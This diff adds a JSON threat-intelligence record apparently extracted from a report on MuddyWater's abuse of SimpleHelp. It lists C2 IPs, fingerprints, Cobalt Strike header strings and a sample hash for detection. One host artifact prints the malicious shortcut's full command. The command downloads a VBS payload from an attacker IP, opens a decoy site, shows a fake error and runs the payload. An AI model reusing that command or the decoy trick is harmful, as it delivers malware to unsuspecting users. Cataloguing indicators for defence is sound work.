@@ -1,0 +1,218 @@
+{
+  "malware_family": "SimpleHarm",
+  "threat_actor": "MuddyWater",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "MuddyWater uses the legitimate remote administration tool SimpleHelp for persistence and control, delivered via lures such as archives containing malicious shortcuts. The actor's C2 infrastructure is fingerprinted by specific ETag hashes and shared SSH keys, and also includes custom Cobalt Strike configurations and PowerShell backdoors.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "/c curl -s http://91.121.240.108:443/HBIy > C:\\programdata\\temp.vbs && START microsoft-edge:https://mohap.gov.ae/ && msg * The file is c orrupted . && C:\\programdata\\temp.vbs",
+      "context": "Shell command executed by malicious shortcut file.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "C:\\Users\\Pink Panter\\Documents\\PDF.ico",
+      "context": "Icon file path string embedded in the malicious shortcut file metadata.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Pink Panter",
+      "context": "Username of the actor who created the malicious shortcut file.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "{ \"padding\" : \"AAAA\", \"prepend\" : \"WWWW\", \"header\" : \"Content-Type\", \"name\" : \"X-Request-Ld\" }",
+      "context": "A unique header definition in the actor's custom Cobalt Strike configuration.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "{ \"padding\" : \"AAAA\", \"prepend\" : \"WWWW\", \"header\" : \"Cookie\", \"name\" : \"SID\" }",
+      "context": "A unique header definition in the actor's custom Cobalt Strike configuration.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "new aviation communications.exe",
+      "context": "Filename for a legitimate SimpleHelp installer used by MuddyWater.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "request-for-service-no10102022.zip",
+      "context": "Archive file containing a malicious shortcut.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "The file is c orrupted .",
+      "context": "Decoy error message displayed to the user by the shortcut command.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\programdata\\temp.vbs",
+      "context": "Path where the second-stage VBS payload is saved.",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "http_header",
+      "value": "2aa6-5c939a3a79153",
+      "context": "ETag hash value used to fingerprint MuddyWater C2 servers.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "2aa6-5b27e6e58988b",
+      "context": "ETag hash value used to fingerprint MuddyWater C2 servers.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "2aa6-5c939a773f7a2",
+      "context": "ETag hash value used to fingerprint MuddyWater C2 servers.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "e7383c77c6f804cffac6c88651b7bce2",
+      "context": "SSH key fingerprint shared between MuddyWater servers.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "3648a6085512ab91f5a23bafb8418f7b",
+      "context": "SSH key fingerprint shared between MuddyWater servers.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/HBIy",
+      "context": "URI for downloading the second-stage VBS payload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://91.121.240.108:443/HBIy",
+      "context": "Full URL used by shortcut to download second stage VBS payload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "51.254.25.36",
+      "context": "MuddyWater server linked to SimpleHelp installer.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "51.255.19.179",
+      "context": "MuddyWater server with SimpleHelp deployed.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "51.255.19.178",
+      "context": "MuddyWater server with SimpleHelp deployed.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "164.132.237.65",
+      "context": "MuddyWater server with a custom Cobalt Strike configuration.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "91.121.240.96",
+      "context": "C2 server for a PowerShell backdoor.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "91.121.240.108",
+      "context": "C2 server for a malicious shortcut.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "2528838a609aa143769efb37dff45af723868d4ed33eb1ce0e2d6ce64b2a1507",
+      "description": "Malicious shortcut file distributed in request-for-service-no10102022.zip"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "script",
+    "archive"
+  ]
+}
